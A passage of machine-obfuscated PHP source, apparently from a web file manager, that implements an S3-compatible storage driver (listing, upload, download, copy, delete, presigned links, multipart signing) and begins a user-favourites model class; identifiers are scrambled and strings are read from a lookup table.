slicePath($©¥­Ì—é) { $÷ğ¼ˆ‰ =& $_SERVER[ú÷îèÆÜ]; $‘¶áó¦Ô = explode($÷ğ¼ˆ‰[18], trim($©¥­Ì—é, $÷ğ¼ˆ‰[18])); $ä„•â = 0; do { ++$ä„•â; $…úàô˜[] = implode($÷ğ¼ˆ‰[18], array_slice($‘¶áó¦Ô, 0, $ä„•â)) . $÷ğ¼ˆ‰[18]; } while ($ä„•â < count($‘¶áó¦Ô)); $…úàô˜[count($‘¶áó¦Ô) - 1] = $©¥­Ì—é; return $…úàô˜; } public function getHost() { $Â“á „× =& $_SERVER[ú÷îèÆÜ]; $õàù¶İ = parse_url(trim($this->domain, $Â“á „×[18])); $–´„É«« = isset($õàù¶İ[$Â“á „×[205]]) ? $õàù¶İ[$Â“á „×[205]] : http_type(); $şºĞÇ™Ş = isset($õàù¶İ[$Â“á „×[206]]) ? $õàù¶İ[$Â“á „×[206]] : $õàù¶İ[$Â“á „×[94]]; if (isset($õàù¶İ[$Â“á „×[207]])) { $şºĞÇ™Ş .= $Â“á „×[4] . $õàù¶İ[$Â“á „×[207]]; } return $–´„É«« . $Â“á „×[208] . $şºĞÇ™Ş; } public function pathEncode($Äı­Õ›í) { $Ê†šñô =& $_SERVER[ú÷îèÆÜ]; return str_replace($Ê†šñô[209], $Ê†šñô[18], rawurlencode($Äı­Õ›í)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\x34"; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public $config = array(); public function __construct($ÅıÊ½…Û) { set_timeout(); require_once SDK_DIR . $_SERVER[ú÷îèÆÜ][210]; parent::__construct(); $this->_init($ÅıÊ½…Û); } public function _init($²úª¸¤Ï) { $this->config = $²úª¸¤Ï; foreach ($²úª¸¤Ï as $“åƒ›˜¼ => $ŸºÃíáş) { if (isset($this->{$“åƒ›˜¼})) { $this->{$“åƒ›˜¼} = $ŸºÃíáş; } } $this->endpoint = $²úª¸¤Ï[$_SERVER[ú÷îèÆÜ][211]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($¸¡¤İŠ = "\166\x34") { $this->signVer = $¸¡¤İŠ; $this->client->setSignatureVersion($¸¡¤İŠ); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { $†ëŠ†í‚ =& $_SERVER[ú÷îèÆÜ]; $´®£æã‹ = $this->getBucketCors(); if (!$´®£æã‹ || !is_array($´®£æã‹)) { return !1; } if ($´®£æã‹[$†ëŠ†í‚[212]] != $†ëŠ†í‚[213] || $´®£æã‹[$†ëŠ†í‚[214]] != $†ëŠ†í‚[213]) { return !1; } $›µ¼°° = array_map($†ëŠ†í‚[215], $´®£æã‹[$†ëŠ†í‚[216]]); if (!is_array($›µ¼°°)) { $›µ¼°° = array(); } $«Æ¸÷ƒı = array($†ëŠ†í‚[217], $†ëŠ†í‚[218], $†ëŠ†í‚[219], $†ëŠ†í‚[220], $†ëŠ†í‚[221]); $’†Ğ§Ö´ = array_diff($«Æ¸÷ƒı, $›µ¼°°); return empty($’†Ğ§Ö´); } public function mkfile($ì¡ É¿, $×•øß®Ë = '', $š¢î–ª“ = REPEAT_RENAME) { $ùö¬¿‡ = $this->setContent($ì¡ É¿, $×•øß®Ë); if ($ùö¬¿‡ !== !1) { return $this->getPathOuter($ì¡ É¿); } return !1; } public function mkdir($Ê°½º¬¥, $Îæ’µ÷ = REPEAT_SKIP) { $ßåËé‡ =& $_SERVER[ú÷îèÆÜ]; if (empty($Ê°½º¬¥) && $Ê°½º¬¥ !== $ßåËé‡[222]) { return !1; } if ($Îæ’µ÷ && $this->_isFolder($Ê°½º¬¥)) { return $this->getPathOuter($Ê°½º¬¥); } $üÎñÍÂ„ = $this->setContent($Ê°½º¬¥, $ßåËé‡[22], !0); if ($üÎñÍÂ„ !== !1) { return $this->getPathOuter($Ê°½º¬¥); } return !1; } public function copyFile($¬ÅÌ†á, $ñ–óƒ¿Ÿ, $»®²¾Éû = array()) { $Ş®óóŞš =& $_SERVER[ú÷îèÆÜ]; $¦ÃÚë‚Â = $this->objectMeta($¬ÅÌ†á); if (!$¦ÃÚë‚Â) { return !1; } if ($¦ÃÚë‚Â[$Ş®óóŞš[86]] <= 1024 * 1024 * 200) { $æÜ«‚È› = $this->client->copyObject($this->bucket, $¬ÅÌ†á, $this->bucket, $ñ–óƒ¿Ÿ, $Ş®óóŞš[223], $»®²¾Éû); } else { $æÜ«‚È› = $this->client->multiCopyObject($this->bucket, $¬ÅÌ†á, $this->bucket, $ñ–óƒ¿Ÿ, $»®²¾Éû); } $æÜ«‚È› = $æÜ«‚È› ? $this->getPathOuter($ñ–óƒ¿Ÿ) : !1; return $æÜ«‚È›; } public function moveFile($±‹ˆßà, $ÌËØÅ‡Õ) { if ($this->copyFile($±‹ˆßà, $ÌËØÅ‡Õ)) { $this->delFile($±‹ˆßà); return $this->getPathOuter($ÌËØÅ‡Õ); } return !1; } public function delFile($Œô«…±Â) { return $this->client->deleteObject($this->bucket, $Œô«…±Â); } public function delFolder($Æ×À£—Á) { $èÜÙğøÊ =& $_SERVER[ú÷îèÆÜ]; if (!$this->exist($Æ×À£—Á)) { return !0; } $this->listItemCache = !1; $ÌİĞĞıë = $this->fileList($Æ×À£—Á); $this->listItemCache = !0; $¾´œ¥êÑ = trim($Æ×À£—Á, $èÜÙğøÊ[18]) . $èÜÙğøÊ[18]; if (!empty($Æ×À£—Á) && $Æ×À£—Á !== $èÜÙğøÊ[222] && !in_array($¾´œ¥êÑ, $ÌİĞĞıë[$èÜÙğøÊ[92]])) { $ÌİĞĞıë[$èÜÙğøÊ[92]][] = $¾´œ¥êÑ; } $ñçÎ§˜ = $this->delByBatch($ÌİĞĞıë[$èÜÙğøÊ[93]]); if (!$ñçÎ§˜) { return !1; } $ñçÎ§˜ = $this->delByBatch($ÌİĞĞıë[$èÜÙğøÊ[92]]); if (!$ñçÎ§˜) { return !1; } return $this->delFile($¾´œ¥êÑ); } private function delByBatch($æ•¢è) { foreach (array_chunk($æ•¢è, 1000) as $®¯£­»·) { $£šÀÀïé = $this->client->deleteObjects($this->bucket, $®¯£­»·); if (!$£šÀÀïé) { return !1; } } return !0; } public function rename($·ÒúŞçª, $˜ªÛ£¿) { return $this->renameObject($·ÒúŞçª, $˜ªÛ£¿); } public function listPath($¡è­½ş», $Ù“œí… = false) { $È¿ªÆŒæ =& $_SERVER[ú÷îèÆÜ]; $òÇôøŸ = $this->fileList($¡è­½ş», $È¿ªÆŒæ[18], !0); foreach ($òÇôøŸ[$È¿ªÆŒæ[92]] as $©Æ ÇÚ• => $Ò÷‰¬‚) { $òÇôøŸ[$È¿ªÆŒæ[92]][$©Æ ÇÚ•] = $this->folderInfo($Ò÷‰¬‚, $Ù“œí…, $Ò÷‰¬‚); } foreach ($òÇôøŸ[$È¿ªÆŒæ[93]] as $©Æ ÇÚ• => $Ò÷‰¬‚) { $òÇôøŸ[$È¿ªÆŒæ[93]][$©Æ ÇÚ•] = $this->fileInfo($Ò÷‰¬‚[$È¿ªÆŒæ[42]], $Ù“œí…, $Ò÷‰¬‚); } return $òÇôøŸ; } protected function infoChildren($×Öœ™Ø, &$¾”÷Êª) { $Å‘ùŞˆ =& $_SERVER[ú÷îèÆÜ]; $¾Û£ó¯é = $this->fileList($×Öœ™Ø, $Å‘ùŞˆ[22], !0); $¾”÷Êª[$Å‘ùŞˆ[88]] += count($¾Û£ó¯é[$Å‘ùŞˆ[92]]); $¾”÷Êª[$Å‘ùŞˆ[87]] += count($¾Û£ó¯é[$Å‘ùŞˆ[93]]); foreach ($¾Û£ó¯é[$Å‘ùŞˆ[93]] as $¯ı¶Ÿ¥æ) { if (!$¯ı¶Ÿ¥æ || !$¯ı¶Ÿ¥æ[$Å‘ùŞˆ[86]]) { continue; } $¾”÷Êª[$Å‘ùŞˆ[86]] += $¯ı¶Ÿ¥æ[$Å‘ùŞˆ[86]]; } } private function fileInfo($«©ì—, $Íî„ùşê = false, $ù›ÁùÅĞ = array()) { $½…æØ£Œ =& $_SERVER[ú÷îèÆÜ]; $Á”ò¼³ä = array($½…æØ£Œ[42] => $this->pathThis($«©ì—), $½…æØ£Œ[94] => $this->getPathOuter($«©ì—), $½…æØ£Œ[43] => $½…æØ£Œ[224], $½…æØ£Œ[185] => $this->ext($«©ì—), $½…æØ£Œ[86] => isset($ù›ÁùÅĞ[$½…æØ£Œ[86]]) ? $ù›ÁùÅĞ[$½…æØ£Œ[86]] : 0); if ($Íî„ùşê) { return $Á”ò¼³ä; } $Á”ò¼³ä[$½…æØ£Œ[225]] = $Á”ò¼³ä[$½…æØ£Œ[95]] = 0; $Á”ò¼³ä[$½…æØ£Œ[226]] = $Á”ò¼³ä[$½…æØ£Œ[227]] = !0; if (empty($ù›ÁùÅĞ)) { $ù›ÁùÅĞ = $this->objectMeta($«©ì—); if (!$ù›ÁùÅĞ) { return $Á”ò¼³ä; } } if (isset($ù›ÁùÅĞ[$½…æØ£Œ[228]]) && $ù›ÁùÅĞ[$½…æØ£Œ[228]]) { $Á”ò¼³ä[$½…æØ£Œ[229]] = $ù›ÁùÅĞ[$½…æØ£Œ[228]]; } if (isset($ù›ÁùÅĞ[$½…æØ£Œ[204]])) { $Á”ò¼³ä[$½…æØ£Œ[95]] = $ù›ÁùÅĞ[$½…æØ£Œ[204]]; } if (isset($ù›ÁùÅĞ[$½…æØ£Œ[86]])) { $Á”ò¼³ä[$½…æØ£Œ[86]] = $ù›ÁùÅĞ[$½…æØ£Œ[86]]; } return $Á”ò¼³ä; } private function folderInfo($™îä“, $¤²ßó½º = false, $£ˆõ¯´Æ = array()) { $®ÉÛƒ”Ş =& $_SERVER[ú÷îèÆÜ]; $¾Íµªì = array($®ÉÛƒ”Ş[42] => $this->pathThis($™îä“), $®ÉÛƒ”Ş[94] => $this->getPathOuter($®ÉÛƒ”Ş[18] . $™îä“), $®ÉÛƒ”Ş[43] => $®ÉÛƒ”Ş[85]); if ($¤²ßó½º) { return $¾Íµªì; } $¾Íµªì[$®ÉÛƒ”Ş[225]] = $¾Íµªì[$®ÉÛƒ”Ş[95]] = 0; $¾Íµªì[$®ÉÛƒ”Ş[226]] = $¾Íµªì[$®ÉÛƒ”Ş[227]] = !0; if ($™îä“ == $®ÉÛƒ”Ş[22]) { return $¾Íµªì; } if (empty($£ˆõ¯´Æ)) { $£ˆõ¯´Æ = $this->objectMeta(trim($™îä“, $®ÉÛƒ”Ş[18]) . $®ÉÛƒ”Ş[18]); } if (isset($£ˆõ¯´Æ[$®ÉÛƒ”Ş[204]])) { $¾Íµªì[$®ÉÛƒ”Ş[225]] = $£ˆõ¯´Æ[$®ÉÛƒ”Ş[204]]; } return $¾Íµªì; } private function fileList($Øğøçî›, $ËĞìÜƒº = '', $›«Ø‹ä = 0) { $³Úğ·Ñ‡ =& $_SERVER[ú÷îèÆÜ]; $ÇŸÃŸš = rtrim($Øğøçî›, $³Úğ·Ñ‡[18]) . $³Úğ·Ñ‡[18]; $—âÓŠ = $this->listObjs($ÇŸÃŸš, null, null, $ËĞìÜƒº); if (!$—âÓŠ) { return array($³Úğ·Ñ‡[92] => array(), $³Úğ·Ñ‡[93] => array()); } $”òú×‡ô = $£§Û¡ÜĞ = array(); foreach ($—âÓŠ[$³Úğ·Ñ‡[230]] as $Ëµ Éä×) { $Ğıå²³» = $Ëµ Éä×[$³Úğ·Ñ‡[42]]; if ($Ğıå²³» == $ÇŸÃŸš) { continue; } $ŠØÏÓ¿ = isset($Ëµ Éä×[$³Úğ·Ñ‡[86]]) ? $Ëµ Éä×[$³Úğ·Ñ‡[86]] : 0; $ùê¶ë¨– = $ŠØÏÓ¿ == 0 && substr($Ğıå²³», strlen($Ğıå²³») - 1, 1) == $³Úğ·Ñ‡[18] ? !0 : !1; $this->cacheMethodInfoSet($Ğıå²³», $ùê¶ë¨–, $Ëµ Éä×); if ($ùê¶ë¨–) { $”òú×‡ô[] = $Ğıå²³»; continue; } $£§Û¡ÜĞ[] = $›«Ø‹ä ? $Ëµ Éä× : $Ğıå²³»; } foreach ($—âÓŠ[$³Úğ·Ñ‡[231]] as $Ëµ Éä×) { $”òú×‡ô[] = $Ëµ Éä×[$³Úğ·Ñ‡[42]]; $this->cacheMethodInfoSet($Ëµ Éä×[$³Úğ·Ñ‡[42]], !0); } $this->cacheMethodInfoSet($Øğøçî›, !0); return array($³Úğ·Ñ‡[92] => $”òú×‡ô, $³Úğ·Ñ‡[93] => $£§Û¡ÜĞ); } private function listObjs($ò•Æ“Í€, $ÛäÕéì = null, $ˆ‚‹ıí = null, $ùğ’±û = null) { $×â´¶¡‰ =& $_SERVER[ú÷îèÆÜ]; $ò•Æ“Í€ = trim($ò•Æ“Í€, $×â´¶¡‰[18]); $ğÂ¸’İî = empty($ò•Æ“Í€) && $ò•Æ“Í€ !== $×â´¶¡‰[222] ? $×â´¶¡‰[22] : $ò•Æ“Í€ . $×â´¶¡‰[18]; return $this->client->getBucket($this->bucket, $ğÂ¸’İî, $ÛäÕéì, $ˆ‚‹ıí, $ùğ’±û, !0); } public function has($ÁñƒÙùŠ, $…•å˜ = false, $º¾ÀÁ·ë = true) { $¸ğ°èŸ‚ =& $_SERVER[ú÷îèÆÜ]; $ÁñƒÙùŠ = trim($ÁñƒÙùŠ, $¸ğ°èŸ‚[18]); $ñè›å‡ = empty($ÁñƒÙùŠ) && $ÁñƒÙùŠ !== $¸ğ°èŸ‚[222] ? $¸ğ°èŸ‚[22] : $ÁñƒÙùŠ . $¸ğ°èŸ‚[18]; $áªŠ€êø = null; $­ûªúÜ = 500; $Ó¤ÀıİÆ = $¸ğ°èŸ‚[18]; $—¯•úé = $îÔ—°à¿ = array(); while (!0) { $ôÇ ¬­ = $this->listObjs($ÁñƒÙùŠ, $áªŠ€êø, $­ûªúÜ, $Ó¤ÀıİÆ); if (!$ôÇ ¬­) { break; } $áªŠ€êø = $ôÇ ¬­[$¸ğ°èŸ‚[232]]; $åôáôÃš = $ôÇ ¬­[$¸ğ°èŸ‚[230]]; $ÕÀ±ÚË = $ôÇ ¬­[$¸ğ°èŸ‚[231]]; if (empty($åôáôÃš) && empty($ÕÀ±ÚË)) { break; } if (count($åôáôÃš) == 1 && $åôáôÃš[0][$¸ğ°èŸ‚[42]] == $ñè›å‡) { break; } if ($…•å˜) { if (count($åôáôÃš)) { $åôáôÃš = array_column($åôáôÃš, $¸ğ°èŸ‚[42]); $—¯•úé = array_merge($—¯•úé, $åôáôÃš); } if (count($ÕÀ±ÚË)) { $ÕÀ±ÚË = array_column($ÕÀ±ÚË, $¸ğ°èŸ‚[42]); $îÔ—°à¿ = array_merge($îÔ—°à¿, $ÕÀ±ÚË); } if ($áªŠ€êø === null) { break; } continue; } if ($º¾ÀÁ·ë) { if (!empty($åôáôÃš)) { if (count($åôáôÃš) > 1 || isset($åôáôÃš[0][$¸ğ°èŸ‚[42]]) && $åôáôÃš[0][$¸ğ°èŸ‚[42]] != $ñè›å‡) { return !0; } } } else { if (!empty($ÕÀ±ÚË)) { return !0; } } if ($áªŠ€êø === null) { break; } } if ($…•å˜) { $—¯•úé = array_diff($—¯•úé, array($ñè›å‡)); $—¯•úé = count(array_unique($—¯•úé)); $îÔ—°à¿ = count(array_unique($îÔ—°à¿)); return array($¸ğ°èŸ‚[233] => $—¯•úé, $¸ğ°èŸ‚[234] => $îÔ—°à¿); } return !1; } public function listAll($Ú¯êƒ¥) { $ş‡ôğ¿ï =& $_SERVER[ú÷îèÆÜ]; $æÎª’Ğ¥ = $this->fileList($Ú¯êƒ¥, $ş‡ôğ¿ï[22], !0); $¿×ÓË‹® = array_to_keyvalue($æÎª’Ğ¥[$ş‡ôğ¿ï[93]], $ş‡ôğ¿ï[42]); foreach ($æÎª’Ğ¥[$ş‡ôğ¿ï[92]] as $¸ßà°Ñ) { if (is_string($¸ßà°Ñ)) { $¿×ÓË‹®[$¸ßà°Ñ] = array($ş‡ôğ¿ï[86] => 0); } } return $this->listAllFiles($Ú¯êƒ¥, $¿×ÓË‹®); } public function canRead($¶õ©¿Ä¿) { $äÂÎã½Ç =& $_SERVER[ú÷îèÆÜ]; $İ­ËÆí = $this->client->getAccessControlPolicy($this->bucket, $¶õ©¿Ä¿); if (!$İ­ËÆí) { return !1; } return in_array($İ­ËÆí, array($äÂÎã½Ç[235], $äÂÎã½Ç[236], $äÂÎã½Ç[237])) ? !0 : !1; } public function canWrite($ÉŒ…™ş‹) { $¿í‘«†÷ =& $_SERVER[ú÷îèÆÜ]; $¦­ıÉ€ş = $this->client->getAccessControlPolicy($this->bucket, $ÉŒ…™ş‹); if (!$¦­ıÉ€ş) { return !1; } return in_array($¦­ıÉ€ş, array($¿í‘«†÷[235], $¿í‘«†÷[236])) ? !0 : !1; } public function getContent($›Ûß¢”Ì) { return $this->client->getObject($this->bucket, $›Ûß¢”Ì); } public function setContent($ãáËäÃ£, $‡—Ö°ŒÛ = '', $Ìû¿Áş = false) { $Œ‡ıùØ« =& $_SERVER[ú÷îèÆÜ]; $ãáËäÃ£ = $Ìû¿Áş ? trim($ãáËäÃ£, $Œ‡ıùØ«[18]) . $Œ‡ıùØ«[18] : $ãáËäÃ£; $‰Íöû½‚ = get_file_mime(get_path_ext($ãáËäÃ£)); $­Û‰™î£ = $this->client->putObject($‡—Ö°ŒÛ, $this->bucket, $ãáËäÃ£, $Œ‡ıùØ«[223], array(), $‰Íöû½‚); if (!$­Û‰™î£) { return !1; } if ($Ìû¿Áş) { return !0; } $this->cacheMethod(null, null); $­Û‰™î£ = $this->copyFile($ãáËäÃ£, $ãáËäÃ£, array($Œ‡ıùØ«[238] => $­Û‰™î£[$Œ‡ıùØ«[228]])); return $­Û‰™î£ ? !0 : !1; } public function fileSubstr($¸ÙÜÅ, $Ğ€Œ¤Ç…, $ûõÛ¥¹) { $·¡‘‘… = $Ğ€Œ¤Ç… + $ûõÛ¥¹ - 1; return $this->client->getObject($this->bucket, $¸ÙÜÅ, array($_SERVER[ú÷îèÆÜ][239] => "\x62\x79\x74\145\x73\75{$Ğ€Œ¤Ç…}\55{$·¡‘‘…}")); } public function upload($Çº–¿ğ½, $Î‰ÌÜÑù, $ÇÊ„İëŸ = false, $´£…š ß = REPEAT_REPLACE) { $½ß‘Ôîø =& $_SERVER[ú÷îèÆÜ]; $î¢¾ïß = array($½ß‘Ôîø[238] => @md5_file($Î‰ÌÜÑù)); $Şá–¬öÅ = array($½ß‘Ôîø[240] => get_file_mime(get_path_ext($Çº–¿ğ½))); if (IO::size($Î‰ÌÜÑù) <= 1024 * 1024 * 200) { $ÁúÓ»… = $this->client->putObjectFile($Î‰ÌÜÑù, $this->bucket, $Çº–¿ğ½, $½ß‘Ôîø[223], $î¢¾ïß, $Şá–¬öÅ); return !empty($ÁúÓ»…) ? $this->getPathOuter($Çº–¿ğ½) : !1; } $ÆÁ©¼„– = $this->client->multiUploadObject($Î‰ÌÜÑù, $this->bucket, trim($Çº–¿ğ½, $½ß‘Ôîø[18]), $î¢¾ïß, $Şá–¬öÅ); return $ÆÁ©¼„– ? $this->getPathOuter($Çº–¿ğ½) : !1; } public function download($¶ßî¢÷¬, $Îúå±) { if (!@is_dir($this->pathFather($Îúå±)) && !IO::mkdir($this->pathFather($Îúå±))) { return !1; } $Ç§çâ½Í = $this->client->getObject($this->bucket, $¶ßî¢÷¬, array(), $Îúå±); return $Ç§çâ½Í !== !1 ? $Îúå± : !1; } public function link($Ó§¹¼‚•, $…ìÀ˜€‰ = array()) { $ÛûÆÓš· =& $_SERVER[ú÷îèÆÜ]; if ($this->signVer == $ÛûÆÓš·[241]) { return $this->client->getAuthenticatedURL($this->bucket, $Ó§¹¼‚•, 3600 * 12, $…ìÀ˜€‰); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($Ó§¹¼‚•, $ÛûÆÓš·[18]), 3600 * 12, $this->region, array(), !0, $…ìÀ˜€‰); } public function fileOut($îÓ™ë¥Ú, $Êåşï…– = false, $¸ü¯²óÚ = false, $ä€æ¸¯ä = '') { $ÒòÑÍù¦ =& $_SERVER[ú÷îèÆÜ]; if ($this->isFileOutServer()) { return $this->fileOutServer($îÓ™ë¥Ú, $Êåşï…–, $¸ü¯²óÚ, $ä€æ¸¯ä); } if (!$¸ü¯²óÚ) { $¸ü¯²óÚ = $this->pathThis($îÓ™ë¥Ú); } $É­õ˜Î¢ = get_file_mime(get_path_ext($¸ü¯²óÚ)); if ($É­õ˜Î¢ == $ÒòÑÍù¦[242]) { return parent::fileOut($îÓ™ë¥Ú, $Êåşï…–, $¸ü¯²óÚ, $ä€æ¸¯ä); } $˜ÑËÄÍó = array($ÒòÑÍù¦[243] => $É­õ˜Î¢); if ($Êåşï…–) { $˜ÑËÄÍó[$ÒòÑÍù¦[244]] = $ÒòÑÍù¦[245] . rawurlencode($¸ü¯²óÚ); } else { } $Šå¨À‰¤ = $this->link($îÓ™ë¥Ú, $˜ÑËÄÍó); $this->fileOutLink($Šå¨À‰¤); } public function fileOutServer($Ì“üßŠø, $‹âˆç§® = false, $İ¨•½ñ€ = false, $¢»†ö‹ = '') { parent::fileOut($Ì“üßŠø, $‹âˆç§®, $İ¨•½ñ€, $¢»†ö‹); } public function fileOutImageServer($Ë™œÊ¾Ë, $ó†åáœ = 250) { parent::fileOutImage($Ë™œÊ¾Ë, $ó†åáœ); } public function hashMd5($×Ù†Ì·ü, $Å›±Šœ = '') { $Ÿ©§¥œ© =& $_SERVER[ú÷îèÆÜ]; $¬Æê‰­ì = $this->objectMeta($×Ù†Ì·ü); if (!$¬Æê‰­ì) { return !1; } $Å›±Šœ = $Å›±Šœ ? $Å›±Šœ : _get($¬Æê‰­ì, $Ÿ©§¥œ©[246]); $Å›±Šœ = $Å›±Šœ ? $Å›±Šœ : _get($¬Æê‰­ì, $Ÿ©§¥œ©[228], $Ÿ©§¥œ©[22]); return $Å›±Šœ; } public function uploadFormData($ï‚½ã¤§, $íÈº©Ûâ = 3600) { $²‹ÂÑş =& $_SERVER[ú÷îèÆÜ]; $¡ü«ƒ÷² = $this->pathFather($ï‚½ã¤§); $Œ§•õı’ = $this->client->getHttpUploadPostParams($this->bucket, $¡ü«ƒ÷², $²‹ÂÑş[223], $íÈº©Ûâ); return array_merge((array) $Œ§•õı’, array($²‹ÂÑş[206] => $this->getHost())); } public function multiUploadFormData($¿Õ¯¥, $²û•œ³ğ = 3600) { $®ş‘ñÍÂ =& $_SERVER[ú÷îèÆÜ]; $—”¬…× = gmdate($®ş‘ñÍÂ[247]); $æÒèÄ = array(); $ç¼¥ˆ¦Ö = $this->client->getUploadId($this->bucket, $¿Õ¯¥, $æÒèÄ); if (!$ç¼¥ˆ¦Ö) { return !1; } return array($®ş‘ñÍÂ[248] => $ç¼¥ˆ¦Ö, $®ş‘ñÍÂ[206] => $this->getHost() . $®ş‘ñÍÂ[18] . $this->pathEncode($¿Õ¯¥), $®ş‘ñÍÂ[249] => $—”¬…×, $®ş‘ñÍÂ[104] => $¿Õ¯¥); } public function multiUploadAuthData($Å†™—˜ˆ, $¹Ï©°ÊØ = array()) { $ÂøÏ¯£ =& $_SERVER[ú÷îèÆÜ]; $ìåæ¦úÖ = isset($¹Ï©°ÊØ[$ÂøÏ¯£[249]]) ? $¹Ï©°ÊØ[$ÂøÏ¯£[249]] : gmdate($ÂøÏ¯£[247]); $Â‚†á…ô = isset($¹Ï©°ÊØ[$ÂøÏ¯£[185]]) ? $¹Ï©°ÊØ[$ÂøÏ¯£[185]] : $ÂøÏ¯£[22]; $ÄÅ•…‘ = $¹Ï©°ÊØ[$ÂøÏ¯£[104]]; unset($¹Ï©°ÊØ[$ÂøÏ¯£[104]]); if (isset($¹Ï©°ÊØ[$ÂøÏ¯£[250]])) { $¹Ï©°ÊØ[$ÂøÏ¯£[249]] = $ìåæ¦úÖ; return $this->listUploadParts($ÄÅ•…‘, $¹Ï©°ÊØ); } $úİ¨„Õü = array($ÂøÏ¯£[251], $ÂøÏ¯£[22], $ÂøÏ¯£[130], $ÂøÏ¯£[22], "\170\x2d\x61\155\x7a\55\144\141\x74\x65\72{$ìåæ¦úÖ}", $ÂøÏ¯£[18] . $this->bucket . $ÂøÏ¯£[18] . $this->pathEncode($ÄÅ•…‘) . $Â‚†á…ô); if (strpos($Â‚†á…ô, $ÂøÏ¯£[252]) === 0) { $úİ¨„Õü[0] = $ÂøÏ¯£[253]; } if (isset($¹Ï©°ÊØ[$ÂøÏ¯£[254]]) && $¹Ï©°ÊØ[$ÂøÏ¯£[254]] == $ÂøÏ¯£[255]) { $úİ¨„Õü[0] = $ÂøÏ¯£[255]; } $—œ¡™Ô· = implode($ÂøÏ¯£[11], $úİ¨„Õü); $á®©ïê = base64_encode(hash_hmac($ÂøÏ¯£[256], $—œ¡™Ô·, $this->secret, !0)); $ò¥ı¿ïÆ = $ÂøÏ¯£[257] . $this->accessKey . $ÂøÏ¯£[4] . $á®©ïê; if (strpos($Â‚†á…ô, $ÂøÏ¯£[252]) === 0) { return array($ÂøÏ¯£[258] => $ò¥ı¿ïÆ, $ÂøÏ¯£[249] => $ìåæ¦úÖ); } return $ò¥ı¿ïÆ; } public function listUploadParts($Á¸“ííÍ, $”¬¤»çƒ = array()) { $ÜıÊ¦í‰ =& $_SERVER[ú÷îèÆÜ]; $ûáú‹ëƒ = str_replace($ÜıÊ¦í‰[259], $ÜıÊ¦í‰[22], $”¬¤»çƒ[$ÜıÊ¦í‰[185]]); $ë°ÁüŒÊ = $this->client->listParts($this->bucket, $Á¸“ííÍ, $ûáú‹ëƒ); if (!$ë°ÁüŒÊ) { return !1; } unset($”¬¤»çƒ[$ÜıÊ¦í‰[250]], $”¬¤»çƒ[$ÜıÊ¦í‰[254]]); $”¬¤»çƒ[$ÜıÊ¦í‰[104]] = $Á¸“ííÍ; $©¤¿ıı¾ = $this->multiUploadAuthData($Á¸“ííÍ, $”¬¤»çƒ); if (empty($©¤¿ıı¾)) { return !1; } return array($ÜıÊ¦í‰[258] => $©¤¿ıı¾, $ÜıÊ¦í‰[249] => $”¬¤»çƒ[$ÜıÊ¦í‰[249]], $ÜıÊ¦í‰[260] => $ë°ÁüŒÊ); } public function getHost() { return parent::getHost() . $_SERVER[ú÷îèÆÜ][18] . $this->bucket; } public function size($Õº¤ı¯Õ) { $Š³ëÓÊº = $this->objectMeta($Õº¤ı¯Õ); return $Š³ëÓÊº ? $Š³ëÓÊº[$_SERVER[ú÷îèÆÜ][86]] : 0; } public function info($ªîµ´¢¾) { if ($this->isFolder($ªîµ´¢¾)) { return $this->folderInfo($ªîµ´¢¾); } else { if ($this->isFile($ªîµ´¢¾)) { return $this->fileInfo($ªîµ´¢¾); } } return !1; } public function exist($·èÚÙØı) { return $this->isFile($·èÚÙØı) || $this->isFolder($·èÚÙØı); } public function isFile($èì¹èÎ) { return !$this->isFolder($èì¹èÎ) && $this->objectMeta($èì¹èÎ); } public function isFolder($¤í±ñÕ†) { return $this->cacheMethod($_SERVER[ú÷îèÆÜ][176], $¤í±ñÕ†); } protected function objectMeta($›Úı¯ÌÖ) { return $this->cacheMethod($_SERVER[ú÷îèÆÜ][178], $›Úı¯ÌÖ); } protected function _objectMeta($æ²ßŠûä) { $ßéí‹— =& $_SERVER[ú÷îèÆÜ]; $æ²ßŠûä = rtrim($æ²ßŠûä, $ßéí‹—[18]); try { $œõ—Ø«é = $this->client->getObjectInfo($this->bucket, $æ²ßŠûä); if (!isset($œõ—Ø«é[$ßéí‹—[246]]) && isset($œõ—Ø«é[$ßéí‹—[261]])) { $œõ—Ø«é[$ßéí‹—[246]] = $œõ—Ø«é[$ßéí‹—[261]]; } } catch (Exception $ÀĞ£êƒ) { $œõ—Ø«é = !1; } if (!$œõ—Ø«é) { } return $œõ—Ø«é; } protected function _isFolder($¦Ê†—˜í) { $±üç¤ùß =& $_SERVER[ú÷îèÆÜ]; $¦Ê†—˜í = rtrim($¦Ê†—˜í, $±üç¤ùß[18]); if ($¦Ê†—˜í == $±üç¤ùß[22] || $¦Ê†—˜í == $±üç¤ùß[18]) { return !0; } $ç¦¾àå = $this->client->getBucket($this->bucket, $¦Ê†—˜í, null, 1); if (empty($ç¦¾àå[$±üç¤ùß[230]])) { return !1; } $öºíîÙ  = $ç¦¾àå[$±üç¤ùß[230]][0][$±üç¤ùß[42]]; return stripos($öºíîÙ , $¦Ê†—˜í . $±üç¤ùß[18]) === 0 ? !0 : !1; if (substr($öºíîÙ , -1) == $±üç¤ùß[18]) { return !0; } if (get_path_this($öºíîÙ ) == get_path_this($¦Ê†—˜í)) { return !1; } return !0; } } goto EøÂ…©¡†; B¥Âà¶™œ‹: class UserFavModel extends ModelBase { protected $tableName = "\165\x73\x65\162\137\146\x61\166"; protected function cacheFunctionAlias($…—Â§Ô€) { $°ÏÌ„€Í =& $_SERVER[ú÷îèÆÜ]; return array($°ÏÌ„€Í[1994] => array(USER_ID, $°ÏÌ„€Í[2332])); } protected function listData() { $ƒó›ŒšÜ =& $_SERVER[ú÷îèÆÜ]; $Ç«ã£Ä¯ = array($ƒó›ŒšÜ[1676] => USER_ID, $ƒó›ŒšÜ[534] => 0); $¨½÷ÎıË = $ƒó›ŒšÜ[2333]; $Û‚õÉÙì = $this->field($¨½÷ÎıË)->where($Ç«ã£Ä¯)->order($ƒó›ŒšÜ[2334])->select(); return $Û‚õÉÙì ? $Û‚õÉÙì : array(); } protected function resetCache() { } protected function listView() { 